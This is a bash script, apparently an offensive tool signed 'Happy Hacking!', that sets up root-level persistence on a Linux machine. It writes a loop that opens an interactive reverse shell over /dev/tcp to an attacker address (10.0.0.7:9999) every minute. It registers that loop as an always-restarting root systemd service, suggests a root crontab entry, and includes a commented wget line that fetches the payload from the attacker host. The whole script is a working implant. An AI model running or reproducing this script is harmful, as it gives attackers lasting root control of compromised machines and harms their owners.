#
#There's two main ways to use this:
#1. Static Method
#	a. This method is the simplest and doesn't require the interactive shell.
#	b. This method works with /etc/crontab quite nicely, too
#	c. Example /etc/crontab entry: "* * * * * root /root/Install.sh"
#2. Interactive Method
#	a. If you have an interactive shell, this is a tad more customizable.
#
#ENSURE THAT YOU DISABLE THE ALTERNATE METHOD. BOTH CANNOT BE ENABLED AT THE SAME TIME!
#
#Happy Hacking!
# -N
#


#STATIC Method:
RHOST=10.0.0.7
RPORT=9999

#INTERACTIVE Method:
#read -p 'Attacker IP:' RHOST
#read -p 'Attacker Port:' RPORT




cd /srv
echo "Creating Persistence_Service Directory.."
mkdir /srv/Persistence_Service
cd /srv/Persistence_Service
echo "Creating Persistence_Service Shell File.."
echo "#!/bin/bash" > Persistence_Service.sh
echo "while true" >> Persistence_Service.sh
echo "do" >> Persistence_Service.sh
echo "bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1" >> Persistence_Service.sh
echo "sleep 1m" >> Persistence_Service.sh
echo "done" >> Persistence_Service.sh
#wget http://${RHOST}:${RPORT}/Persistence_Service.sh
echo "Marking Executable.."
chmod +x ./Persistence_Service.sh
cd /etc/systemd/system
echo "Creating Persistence_Service Service.."
echo "[Unit]" > Persistence_Service.service
echo "Description=Persistence Service" >> Persistence_Service.service
echo "After=network.target" >> Persistence_Service.service
echo "" >> Persistence_Service.service
echo "[Service]" >> Persistence_Service.service
echo "User=root" >> Persistence_Service.service
echo "Group=root" >> Persistence_Service.service
echo "WorkingDirectory=/srv/Persistence_Service/" >> Persistence_Service.service
echo "Restart=always" >> Persistence_Service.service
echo "ExecStart=/srv/Persistence_Service/Persistence_Service.sh" >> Persistence_Service.service
echo "" >> Persistence_Service.service
echo "[Install]" >> Persistence_Service.service
echo "WantedBy=multi-user.target" >> Persistence_Service.service
echo "Installing Service.."
systemctl enable Persistence_Service
systemctl start Persistence_Service
echo "Reloading Daemons.."
systemctl daemon-reload
echo "[[ --> PERSISTENCE ESTABLISHED <-- ]]"

